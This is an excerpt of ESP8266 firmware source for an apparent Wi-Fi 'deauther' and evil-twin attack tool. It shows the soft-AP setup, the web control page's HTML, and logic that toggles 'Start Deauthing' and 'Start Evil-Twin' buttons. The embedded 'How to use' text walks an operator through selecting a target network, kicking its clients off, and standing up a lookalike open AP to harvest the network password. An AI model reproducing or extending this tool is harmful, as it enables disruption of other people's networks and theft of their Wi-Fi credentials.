...
void setup() {
  ...
  WiFi.softAP("Hidden Network", "deauther");
...
//You can change the following row to change the interface of web
String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>"
                   "body {font-family: Arial, sans-serif; background-color: #2b2b2b; color: #f1f1f1; margin: 0; padding: 0;}"
                   ...
                   "button {background-color: #bf1f1f; color: white; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; border-radius: 5px;}"
                   ...
                   ".info {font-size: 14px; color: #ff6961; margin-bottom: 15px;}"
                   "</style>"
                   "</head><body>"
                   "<div class='header'>Connected</div>"
                   "<div class='content'>"
                   "<div class='info'>How to use:<br>"
                   "1. Connect to the AP named <q>Hidden Network</q> with password <q>deauther</q> from your phone/PC.<br>"
                   "2. Select the target AP you want to attack (list of available APs refreshes every 30secs - page reload is required).<br>"
                   "3. Click the <q>Start Deauthing</q> button to start kicking devices off the selected network.<br>"
                   "4. Click the <q>Start Evil-Twin</q> button and optionally reconnect to the newly created AP named same as your target (will be open).<br>"
                   "5. You can stop any of the attacks by visiting <q> 192.168.4.1/admin </q> while conected to Evil-Twin AP or by resetting the ESP8266.<br>"
                   "6. Once a correct password is found, AP will be restarted with default ssid <u>Hidden Network / deauther</u> and at the bottom of a table you should be able to see something like <q>Successfully got password for - TARGET_SSID - PASSWORD</q><br>"
                   "Note:<br>"
                   "-If you power down / hard reset the gathered info will be lost<br></div>"

                   "<div style='text-align: center;'>"
                   "<form method='post' action='/?deauth={deauth}'>"
                   "<button style='background-color: #4caf50;'>{deauth_button}</button></form>"
                   "<form method='post' action='/?hotspot={hotspot}'>"
                   "<button style='background-color: #4caf50;'>{hotspot_button}</button></form>"
                   "</div>"
                   "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
  ...
  if (hotspot_active == false) {
    ...
    for (int i = 0; i < 16; ++i) {
      ...
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #4caf50;'>Selected</button></form></td></tr>";
      } else {
    ...
    if (deauthing_active) {
      ...
      _html.replace("<button style='background-color: #4caf50;'>{deauth_button}</button></form>", "<button style='background-color: #bf1f1f;'>Stop Deauthing</button></form>");
    ...
    if (hotspot_active) {
      _html.replace("<button style='background-color: #4caf50;'>{hotspot_button}</button></form>", "<button style='background-color: #bf1f1f;'>Stop EvilTwin</button></form>");
